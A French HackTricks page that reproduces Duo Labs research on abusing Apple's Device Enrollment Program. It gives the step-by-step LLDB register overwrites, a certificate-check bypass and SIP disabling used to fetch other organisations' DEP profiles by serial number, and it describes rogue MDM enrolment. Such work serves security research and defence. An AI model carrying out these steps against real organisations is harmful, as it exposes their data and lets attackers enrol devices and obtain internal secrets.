# Inscription des appareils dans d'autres organisations

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Intro

Comme [**mentionné précédemment**](./#what-is-mdm-mobile-device-management)**,** pour essayer d'inscrire un appareil dans une organisation, **seul un numéro de série appartenant à cette organisation est nécessaire**. Une fois l'appareil inscrit, plusieurs organisations installeront des données sensibles sur le nouvel appareil : certificats, applications, mots de passe WiFi, configurations VPN [et ainsi de suite](https://developer.apple.com/enterprise/documentation/Configuration-Profile-Reference.pdf).\
Par conséquent, cela pourrait être un point d'entrée dangereux pour les attaquants si le processus d'inscription n'est pas correctement protégé.

**La recherche suivante est tirée de** [**https://duo.com/labs/research/mdm-me-maybe**](https://duo.com/labs/research/mdm-me-maybe)

## Inverser le processus

### Binaires impliqués dans DEP et MDM

Tout au long de notre recherche, nous avons exploré les éléments suivants :

* **`mdmclient`** : Utilisé par le système d'exploitation pour communiquer avec un serveur MDM. Sur macOS 10.13.3 et versions antérieures, il peut également être utilisé pour déclencher un check-in DEP.
* **`profiles`** : Un utilitaire qui peut être utilisé pour installer, supprimer et afficher les profils de configuration sur macOS. Il peut également être utilisé pour déclencher un check-in DEP sur macOS 10.13.4 et versions ultérieures.
* **`cloudconfigurationd`** : Le daemon client d'inscription des appareils, qui est responsable de la communication avec l'API DEP et de la récupération des profils d'inscription des appareils.

Lors de l'utilisation de `mdmclient` ou `profiles` pour initier un check-in DEP, les fonctions `CPFetchActivationRecord` et `CPGetActivationRecord` sont utilisées pour récupérer le _Record d'Activation_. `CPFetchActivationRecord` délègue le contrôle à `cloudconfigurationd` via [XPC](https://developer.apple.com/documentation/xpc), qui récupère ensuite le _Record d'Activation_ de l'API DEP.

`CPGetActivationRecord` récupère le _Record d'Activation_ à partir du cache, si disponible. Ces fonctions sont définies dans le framework privé des profils de configuration, situé à `/System/Library/PrivateFrameworks/Configuration Profiles.framework`.

### Ingénierie inverse du protocole Tesla et du schéma Absinthe

Pendant le processus de check-in DEP, `cloudconfigurationd` demande un _Record d'Activation_ à _iprofiles.apple.com/macProfile_. Le payload de la requête est un dictionnaire JSON contenant deux paires clé-valeur :
```
{
"sn": "",
action": "RequestProfileConfiguration
}
```
Le payload est signé et chiffré en utilisant un schéma en interne appelé "Absinthe". Le payload chiffré est ensuite encodé en Base 64 et utilisé comme corps de la requête dans une requête HTTP POST vers _iprofiles.apple.com/macProfile_.

Dans `cloudconfigurationd`, la récupération de l'_Activation Record_ est gérée par la classe `MCTeslaConfigurationFetcher`. Le déroulement général à partir de `[MCTeslaConfigurationFetcher enterState:]` est le suivant :
```
rsi = @selector(verifyConfigBag);
rsi = @selector(startCertificateFetch);
rsi = @selector(initializeAbsinthe);
rsi = @selector(startSessionKeyFetch);
rsi = @selector(establishAbsintheSession);
rsi = @selector(startConfigurationFetch);
rsi = @selector(sendConfigurationInfoToRemote);
rsi = @selector(sendFailureNoticeToRemote);
```
Depuis que le schéma **Absinthe** semble être utilisé pour authentifier les requêtes au service DEP, **l'ingénierie inverse** de ce schéma nous permettrait de faire nos propres requêtes authentifiées à l'API DEP. Cela s'est avéré **chronophage**, principalement à cause du nombre d'étapes impliquées dans l'authentification des requêtes. Plutôt que de décomposer entièrement le fonctionnement de ce schéma, nous avons choisi d'explorer d'autres méthodes pour insérer des numéros de série arbitraires dans le cadre de la demande d'_Activation Record_.

### Intercepter les requêtes DEP

Nous avons exploré la faisabilité de proxyer les requêtes réseau vers _iprofiles.apple.com_ avec [Charles Proxy](https://www.charlesproxy.com). Notre objectif était d'inspecter le payload envoyé à _iprofiles.apple.com/macProfile_, puis d'insérer un numéro de série arbitraire et de rejouer la requête. Comme mentionné précédemment, le payload soumis à ce point de terminaison par `cloudconfigurationd` est au format [JSON](https://www.json.org) et contient deux paires clé-valeur.
```
{
"action": "RequestProfileConfiguration",
sn": "
}
```
Étant donné que l'API sur _iprofiles.apple.com_ utilise [Transport Layer Security](https://en.wikipedia.org/wiki/Transport\_Layer\_Security) (TLS), nous avons dû activer le Proxying SSL dans Charles pour cet hôte afin de voir le contenu en clair des requêtes SSL.

Cependant, la méthode `-[MCTeslaConfigurationFetcher connection:willSendRequestForAuthenticationChallenge:]` vérifie la validité du certificat serveur et interrompra si la confiance envers le serveur ne peut être vérifiée.
```
[ERROR] Unable to get activation record: Error Domain=MCCloudConfigurationErrorDomain Code=34011
"The Device Enrollment server trust could not be verified. Please contact your system
administrator." UserInfo={USEnglishDescription=The Device Enrollment server trust could not be
verified. Please contact your system administrator., NSLocalizedDescription=The Device Enrollment
server trust could not be verified. Please contact your system administrator.,
MCErrorType=MCFatalError}
```
Le message d'erreur affiché ci-dessus se trouve dans un fichier binaire _Errors.strings_ avec la clé `CLOUD_CONFIG_SERVER_TRUST_ERROR`, qui est situé à `/System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings`, avec d'autres messages d'erreur associés.
```
$ cd /System/Library/CoreServices
$ rg "The Device Enrollment server trust could not be verified"
ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
<snip>
```
Le fichier _Errors.strings_ peut être [affiché dans un format lisible par l'homme](https://duo.com/labs/research/mdm-me-maybe#error_strings_output) avec la commande intégrée `plutil`.
```
$ plutil -p /System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
```
Après avoir examiné de plus près la classe `MCTeslaConfigurationFetcher`, il est devenu évident que ce comportement de confiance du serveur peut être contourné en activant l'option de configuration `MCCloudConfigAcceptAnyHTTPSCertificate` sur le domaine de préférence `com.apple.ManagedClient.cloudconfigurationd`.
```
loc_100006406:
rax = [NSUserDefaults standardUserDefaults];
rax = [rax retain];
r14 = [rax boolForKey:@"MCCloudConfigAcceptAnyHTTPSCertificate"];
r15 = r15;
[rax release];
if (r14 != 0x1) goto loc_10000646f;
```
L'option de configuration `MCCloudConfigAcceptAnyHTTPSCertificate` peut être définie avec la commande `defaults`.
```
sudo defaults write com.apple.ManagedClient.cloudconfigurationd MCCloudConfigAcceptAnyHTTPSCertificate -bool yes
```
Avec le proxy SSL activé pour _iprofiles.apple.com_ et `cloudconfigurationd` configuré pour accepter n'importe quel certificat HTTPS, nous avons tenté de réaliser une attaque de l'homme du milieu et de rejouer les requêtes dans Charles Proxy.

Cependant, puisque la charge utile incluse dans le corps de la requête HTTP POST vers _iprofiles.apple.com/macProfile_ est signée et chiffrée avec Absinthe, (`NACSign`), **il n'est pas possible de modifier la charge utile JSON en clair pour inclure un numéro de série arbitraire sans également avoir la clé pour la déchiffrer**. Bien qu'il serait possible d'obtenir la clé car elle reste en mémoire, nous avons plutôt choisi d'explorer `cloudconfigurationd` avec le débogueur [LLDB](https://lldb.llvm.org).

### Instrumentation des binaires système interagissant avec DEP

La dernière méthode que nous avons explorée pour automatiser le processus de soumission de numéros de série arbitraires à _iprofiles.apple.com/macProfile_ consistait à instrumenter les binaires natifs qui interagissent directement ou indirectement avec l'API DEP. Cela a impliqué une exploration initiale de `mdmclient`, `profiles` et `cloudconfigurationd` dans [Hopper v4](https://www.hopperapp.com) et [Ida Pro](https://www.hex-rays.com/products/ida/), ainsi que de longues sessions de débogage avec `lldb`.

L'un des avantages de cette méthode par rapport à la modification des binaires et à leur re-signature avec notre propre clé est qu'elle contourne certaines des restrictions d'entitlements intégrées dans macOS qui pourraient autrement nous dissuader.

**Protection de l'intégrité du système**

Pour instrumenter les binaires système, (tels que `cloudconfigurationd`) sur macOS, la [Protection de l'intégrité du système](https://support.apple.com/fr-fr/HT204899) (SIP) doit être désactivée. SIP est une technologie de sécurité qui protège les fichiers, dossiers et processus au niveau du système contre les manipulations, et est activée par défaut sur OS X 10.11 "El Capitan" et les versions ultérieures. [SIP peut être désactivée](https://developer.apple.com/library/archive/documentation/Security/Conceptual/System_Integrity_Protection_Guide/ConfiguringSystemIntegrityProtection/ConfiguringSystemIntegrityProtection.html) en démarrant en mode de récupération et en exécutant la commande suivante dans l'application Terminal, puis en redémarrant :
```
csrutil enable --without debug
```
Il convient de noter, cependant, que SIP est une fonctionnalité de sécurité utile et ne devrait être désactivée que pour la recherche et les tests sur des machines non productives. Il est également possible (et recommandé) de le faire sur des Machines Virtuelles non critiques plutôt que sur le système d'exploitation hôte.

**Instrumentation Binaire Avec LLDB**

Avec SIP désactivé, nous avons ensuite pu avancer avec l'instrumentation des binaires système qui interagissent avec l'API DEP, à savoir, le binaire `cloudconfigurationd`. Comme `cloudconfigurationd` nécessite des privilèges élevés pour s'exécuter, nous devons démarrer `lldb` avec `sudo`.
```
$ sudo lldb
(lldb) process attach --waitfor --name cloudconfigurationd
```
Alors que `lldb` est en attente, nous pouvons nous attacher à `cloudconfigurationd` en exécutant `sudo /usr/libexec/mdmclient dep nag` dans une fenêtre de Terminal séparée. Une fois attaché, une sortie similaire à la suivante sera affichée et les commandes LLDB peuvent être saisies à l'invite.
```
Process 861 stopped
* thread #1, stop reason = signal SIGSTOP
<snip>
Target 0: (cloudconfigurationd) stopped.

Executable module set to "/usr/libexec/cloudconfigurationd".
Architecture set to: x86_64h-apple-macosx.
(lldb)
```
**Définition du numéro de série de l'appareil**

L'une des premières choses que nous avons recherchées en inversant `mdmclient` et `cloudconfigurationd` était le code responsable de la récupération du numéro de série du système, car nous savions que le numéro de série était finalement responsable de l'authentification de l'appareil. Notre objectif était de modifier le numéro de série en mémoire après qu'il soit récupéré de l'[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), et de l'utiliser lorsque `cloudconfigurationd` construit le payload `macProfile`.

Bien que `cloudconfigurationd` soit finalement responsable de la communication avec l'API DEP, nous avons également examiné si le numéro de série du système est récupéré ou utilisé directement dans `mdmclient`. Le numéro de série récupéré comme indiqué ci-dessous n'est pas celui qui est envoyé à l'API DEP, mais il a révélé un numéro de série codé en dur qui est utilisé si une option de configuration spécifique est activée.
```
int sub_10002000f() {
if (sub_100042b6f() != 0x0) {
r14 = @"2222XXJREUF";
}
else {
rax = IOServiceMatching("IOPlatformExpertDevice");
rax = IOServiceGetMatchingServices(*(int32_t *)*_kIOMasterPortDefault, rax, &var_2C);
<snip>
}
rax = r14;
return rax;
}
```
Le numéro de série du système est récupéré à partir de [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), à moins que la valeur de retour de `sub_10002000f` ne soit non nulle, auquel cas il est défini sur la chaîne statique "2222XXJREUF". En inspectant cette fonction, il semble qu'elle vérifie si le "mode de test de stress du serveur" est activé.
```
void sub_1000321ca(void * _block) {
if (sub_10002406f() != 0x0) {
*(int8_t *)0x100097b68 = 0x1;
sub_10000b3de(@"Server stress test mode enabled", rsi, rdx, rcx, r8, r9, stack[0]);
}
return;
}
```
Nous avons documenté l'existence du "mode de test de stress du serveur", mais nous ne l'avons pas exploré davantage, car notre objectif était de modifier le numéro de série présenté à l'API DEP. Au lieu de cela, nous avons testé si la modification du numéro de série pointé par le registre `r14` suffirait à récupérer un _Enregistrement d'Activation_ qui n'était pas destiné à la machine sur laquelle nous effectuions des tests.

Ensuite, nous avons examiné comment le numéro de série du système est récupéré au sein de `cloudconfigurationd`.
```
int sub_10000c100(int arg0, int arg1, int arg2, int arg3) {
var_50 = arg3;
r12 = arg2;
r13 = arg1;
r15 = arg0;
rbx = IOServiceGetMatchingService(*(int32_t *)*_kIOMasterPortDefault, IOServiceMatching("IOPlatformExpertDevice"));
r14 = 0xffffffffffff541a;
if (rbx != 0x0) {
rax = sub_10000c210(rbx, @"IOPlatformSerialNumber", 0x0, &var_30, &var_34);
r14 = rax;
<snip>
}
rax = r14;
return rax;
}
```
Comme on peut le voir ci-dessus, le numéro de série est également récupéré depuis le [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) dans `cloudconfigurationd`.

En utilisant `lldb`, nous avons pu modifier le numéro de série récupéré depuis le [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry) en plaçant un point d'arrêt sur `IOServiceGetMatchingService` et en créant une nouvelle variable de chaîne contenant un numéro de série arbitraire et en réécrivant le registre `r14` pour pointer vers l'adresse mémoire de la variable que nous avons créée.
```
(lldb) breakpoint set -n IOServiceGetMatchingService
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --waitfor --name cloudconfigurationd
Process 2208 stopped
* thread #2, queue = 'com.apple.NSXPCListener.service.com.apple.ManagedClient.cloudconfigurationd',
stop reason = instruction step over frame #0: 0x000000010fd824d8
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd + 73
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd:
->  0x10fd824d8 <+73>: movl   %ebx, %edi
0x10fd824da <+75>: callq  0x10ffac91e               ; symbol stub for: IOObjectRelease
0x10fd824df <+80>: testq  %r14, %r14
0x10fd824e2 <+83>: jne    0x10fd824e7               ; <+88>
Target 0: (cloudconfigurationd) stopped.
(lldb) continue  # Will hit breakpoint at `IOServiceGetMatchingService`
# Step through the program execution by pressing 'n' a bunch of times and
# then 'po $r14' until we see the serial number.
(lldb) n
(lldb) po $r14
C02JJPPPQQQRR  # The system serial number retrieved from the `IORegistry`
# Create a new variable containing an arbitrary serial number and print the memory address.
(lldb) p/x @"C02XXYYZZNNMM"
(__NSCFString *) $79 = 0x00007fb6d7d05850 @"C02XXYYZZNNMM"
# Rewrite the `r14` register to point to our new variable.
(lldb) register write $r14 0x00007fb6d7d05850
(lldb) po $r14
# Confirm that `r14` contains the new serial number.
C02XXYYZZNNMM
```
Bien que nous ayons réussi à modifier le numéro de série récupéré depuis [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), la charge utile `macProfile` contenait toujours le numéro de série du système, et non celui que nous avions écrit dans le registre `r14`.

**Exploit : Modification du dictionnaire de requête de profil avant la sérialisation JSON**

Ensuite, nous avons tenté de définir le numéro de série envoyé dans la charge utile `macProfile` d'une manière différente. Cette fois, au lieu de modifier le numéro de série du système récupéré via [`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry), nous avons essayé de trouver le point le plus proche dans le code où le numéro de série est encore en texte clair avant d'être signé avec Absinthe (`NACSign`). Le meilleur point à examiner semblait être `-[MCTeslaConfigurationFetcher startConfigurationFetch]`, qui effectue approximativement les étapes suivantes :

* Crée un nouvel objet `NSMutableData`
* Appelle `[MCTeslaConfigurationFetcher setConfigurationData:]`, en lui passant le nouvel objet `NSMutableData`
* Appelle `[MCTeslaConfigurationFetcher profileRequestDictionary]`, qui retourne un objet `NSDictionary` contenant deux paires clé-valeur :
  * `sn` : Le numéro de série du système
  * `action` : L'action à distance à effectuer (avec `sn` comme argument)
* Appelle `[NSJSONSerialization dataWithJSONObject:]`, en lui passant le `NSDictionary` de `profileRequestDictionary`
* Signe la charge utile JSON en utilisant Absinthe (`NACSign`)
* Encode en base64 la charge utile JSON signée
* Définit la méthode HTTP sur `POST`
* Définit le corps HTTP sur la charge utile JSON signée et encodée en base64
* Définit l'en-tête HTTP `X-Profile-Protocol-Version` sur `1`
* Définit l'en-tête HTTP `User-Agent` sur `ConfigClient-1.0`
* Utilise la méthode `[NSURLConnection alloc] initWithRequest:delegate:startImmediately:]` pour effectuer la requête HTTP

Nous avons ensuite modifié l'objet `NSDictionary` retourné par `profileRequestDictionary` avant qu'il ne soit converti en JSON. Pour ce faire, un point d'arrêt a été placé sur `dataWithJSONObject` afin de nous rapprocher autant que possible des données encore non converties. Le point d'arrêt a été fructueux, et lorsque nous avons imprimé le contenu du registre que nous connaissions grâce au désassemblage (`rdx`), nous avons obtenu les résultats attendus.
```
po $rdx
{
action = RequestProfileConfiguration;
sn = C02XXYYZZNNMM;
}
```
La représentation ci-dessus est une version mise en forme de l'objet `NSDictionary` renvoyé par `[MCTeslaConfigurationFetcher profileRequestDictionary]`. Notre prochain défi était de modifier le `NSDictionary` en mémoire contenant le numéro de série.
```
(lldb) breakpoint set -r "dataWithJSONObject"
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --name "cloudconfigurationd" --waitfor
Process 3291 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x00007fff2e8bfd8f Foundation`+[NSJSONSerialization dataWithJSONObject:options:error:]
Target 0: (cloudconfigurationd) stopped.
# Hit next breakpoint at `dataWithJSONObject`, since the first one isn't where we need to change the serial number.
(lldb) continue
# Create a new variable containing an arbitrary `NSDictionary` and print the memory address.
(lldb) p/x (NSDictionary *)[[NSDictionary alloc] initWithObjectsAndKeys:@"C02XXYYZZNNMM", @"sn",
@"RequestProfileConfiguration", @"action", nil]
(__NSDictionaryI *) $3 = 0x00007ff068c2e5a0 2 key/value pairs
# Confirm that `rdx` contains the new `NSDictionary`.
po $rdx
{
action = RequestProfileConfiguration;
sn = <new_serial_number>
}
```
La liste ci-dessus fait ce qui suit :

* Crée un point d'arrêt d'expression régulière pour le sélecteur `dataWithJSONObject`
* Attend que le processus `cloudconfigurationd` démarre, puis s'y attache
* `continue` l'exécution du programme, (car le premier point d'arrêt que nous rencontrons pour `dataWithJSONObject` n'est pas celui appelé sur le `profileRequestDictionary`)
* Crée et imprime (au format hexadécimal en raison du `/x`) le résultat de la création de notre `NSDictionary` arbitraire
* Comme nous connaissons déjà les noms des clés requises, nous pouvons simplement définir le numéro de série à celui de notre choix pour `sn` et laisser l'action telle quelle
* L'impression du résultat de la création de ce nouveau `NSDictionary` nous indique que nous avons deux paires clé-valeur à un emplacement mémoire spécifique

Notre dernière étape était maintenant de répéter la même étape d'écriture dans `rdx` l'emplacement mémoire de notre objet `NSDictionary` personnalisé qui contient notre numéro de série choisi :
```
(lldb) register write $rdx 0x00007ff068c2e5a0  # Rewrite the `rdx` register to point to our new variable
(lldb) continue
```
Ce pointeur dirige le registre `rdx` vers notre nouveau `NSDictionary` juste avant qu'il ne soit sérialisé en [JSON](https://www.json.org) et `POST`é à _iprofiles.apple.com/macProfile_, puis reprend le flux du programme avec `continue`.

Cette méthode de modification du numéro de série dans le dictionnaire de demande de profil avant d'être sérialisé en JSON a fonctionné. En utilisant un numéro de série Apple enregistré DEP connu comme valide au lieu de (null), le journal de débogage pour `ManagedClient` a affiché le profil DEP complet pour l'appareil :
```
Apr  4 16:21:35[660:1]:+CPFetchActivationRecord fetched configuration:
{
AllowPairing = 1;
AnchorCertificates =     (
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://some.url/cloudenroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "Org address";
OrganizationAddressLine1 = "More address";
OrganizationAddressLine2 = NULL;
OrganizationCity = A City;
OrganizationCountry = US;
OrganizationDepartment = "Org Dept";
OrganizationEmail = "dep.management@org.url";
OrganizationMagic = <unique string>;
OrganizationName = "ORG NAME";
OrganizationPhone = "+1551234567";
OrganizationSupportPhone = "+15551235678";
OrganizationZipCode = "ZIPPY";
SkipSetup =     (
AppleID,
Passcode,
Zoom,
Biometric,
Payment,
TOS,
TapToSetup,
Diagnostics,
HomeButtonSensitivity,
Android,
Siri,
DisplayTone,
ScreenSaver
);
SupervisorHostCertificates =     (
);
}
```
Avec quelques commandes `lldb`, nous pouvons insérer avec succès un numéro de série arbitraire et obtenir un profil DEP qui inclut diverses données spécifiques à l'organisation, y compris l'URL d'inscription MDM de l'organisation. Comme discuté, cette URL d'inscription pourrait être utilisée pour inscrire un appareil malveillant maintenant que nous connaissons son numéro de série. Les autres données pourraient être utilisées pour ingénierie sociale une inscription malveillante. Une fois inscrit, l'appareil pourrait recevoir un certain nombre de certificats, profils, applications, configurations VPN, etc.

### Automatisation de l'instrumentation de `cloudconfigurationd` avec Python

Une fois que nous avions la preuve de concept initiale démontrant comment récupérer un profil DEP valide en utilisant juste un numéro de série, nous avons cherché à automatiser ce processus pour montrer comment un attaquant pourrait abuser de cette faiblesse dans l'authentification.

Heureusement, l'API LLDB est disponible en Python via une [interface de pont de script](https://lldb.llvm.org/python-reference.html). Sur les systèmes macOS avec les [Outils de ligne de commande Xcode](https://developer.apple.com/download/more/) installés, le module `lldb` Python peut être importé comme suit :
```
import lldb
```
Cela a rendu relativement facile le scriptage de notre preuve de concept démontrant comment insérer un numéro de série enregistré DEP et recevoir en retour un profil DEP valide. La preuve de concept que nous avons développée prend une liste de numéros de série séparés par des sauts de ligne et les injecte dans le processus `cloudconfigurationd` pour vérifier les profils DEP.

![Paramètres de proxy SSL Charles.](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2NoYXJsZXNfc3NsX3Byb3h5aW5nX3NldHRpbmdzLnBuZw==?w=800\&fit=contain\&s=d1c9216716bf619e7e10e45c9968f83b)

![Notification DEP.](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2RlcF9ub3RpZmljYXRpb24ucG5n?w=800\&fit=contain\&s=4f7b95efd02245f9953487dcaac6a961)

### Impact

Il existe un certain nombre de scénarios dans lesquels le Programme d'Inscription d'Appareils d'Apple pourrait être abusé, ce qui conduirait à exposer des informations sensibles sur une organisation. Les deux scénarios les plus évidents impliquent l'obtention d'informations sur l'organisation à laquelle appartient un appareil, qui peuvent être récupérées à partir du profil DEP. Le second consiste à utiliser ces informations pour effectuer une inscription DEP et MDM frauduleuse. Chacun de ces points est discuté plus en détail ci-dessous.

#### Divulgation d'Informations

Comme mentionné précédemment, une partie du processus d'inscription DEP implique la demande et la réception d'un _Enregistrement d'Activation_, (ou profil DEP), de l'API DEP. En fournissant un numéro de série de système enregistré DEP valide, nous sommes en mesure de récupérer les informations suivantes, (soit imprimées sur `stdout` soit écrites dans le journal `ManagedClient`, selon la version de macOS).
```
Activation record: {
AllowPairing = 1;
AnchorCertificates =     (
<array_of_der_encoded_certificates>
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://example.com/enroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "123 Main Street, Anywhere, , 12345 (USA)";
OrganizationAddressLine1 = "123 Main Street";
OrganizationAddressLine2 = NULL;
OrganizationCity = Anywhere;
OrganizationCountry = USA;
OrganizationDepartment = "IT";
OrganizationEmail = "dep@example.com";
OrganizationMagic = 105CD5B18CE24784A3A0344D6V63CD91;
OrganizationName = "Example, Inc.";
OrganizationPhone = "+15555555555";
OrganizationSupportPhone = "+15555555555";
OrganizationZipCode = "12345";
SkipSetup =     (
<array_of_setup_screens_to_skip>
);
SupervisorHostCertificates =     (
);
}
```
Bien que certaines de ces informations puissent être publiquement disponibles pour certaines organisations, avoir un numéro de série d'un appareil appartenant à l'organisation ainsi que les informations obtenues du profil DEP pourrait être utilisé contre le service d'assistance ou l'équipe informatique d'une organisation pour réaliser un certain nombre d'attaques d'ingénierie sociale, telles que demander une réinitialisation de mot de passe ou de l'aide pour inscrire un appareil sur le serveur MDM de l'entreprise.

#### Inscription DEP Malveillante

Le [protocole MDM d'Apple](https://developer.apple.com/enterprise/documentation/MDM-Protocol-Reference.pdf) prend en charge - mais n'exige pas - l'authentification de l'utilisateur avant l'inscription MDM via [l'authentification de base HTTP](https://en.wikipedia.org/wiki/Basic\_access\_authentication). **Sans authentification, tout ce qui est nécessaire pour inscrire un appareil sur un serveur MDM via DEP est un numéro de série valide enregistré dans DEP**. Ainsi, un attaquant qui obtient un tel numéro de série (soit par [OSINT](https://en.wikipedia.org/wiki/Open-source\_intelligence), ingénierie sociale, ou par force brute), sera capable d'inscrire un appareil comme s'il appartenait à l'organisation, tant qu'il n'est pas actuellement inscrit sur le serveur MDM. En substance, si un attaquant gagne la course en initiant l'inscription DEP avant le véritable appareil, il peut assumer l'identité de cet appareil.

Les organisations peuvent - et le font - utiliser MDM pour déployer des informations sensibles telles que les certificats d'appareil et d'utilisateur, les données de configuration VPN, les agents d'inscription, les profils de configuration et diverses autres données internes et secrets organisationnels. De plus, certaines organisations choisissent de ne pas exiger l'authentification de l'utilisateur dans le cadre de l'inscription MDM. Cela présente divers avantages, tels qu'une meilleure expérience utilisateur, et ne pas avoir à [exposer le serveur d'authentification interne au serveur MDM pour gérer les inscriptions MDM qui ont lieu en dehors du réseau d'entreprise](https://docs.simplemdm.com/article/93-ldap-authentication-with-apple-dep).

Cela présente cependant un problème lors de l'utilisation de DEP pour amorcer l'inscription MDM, car un attaquant pourrait inscrire n'importe quel point de terminaison de son choix sur le serveur MDM de l'organisation. De plus, une fois qu'un attaquant inscrit avec succès un point de terminaison de son choix dans MDM, il peut obtenir un accès privilégié qui pourrait être utilisé pour pivoter davantage dans le réseau.

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
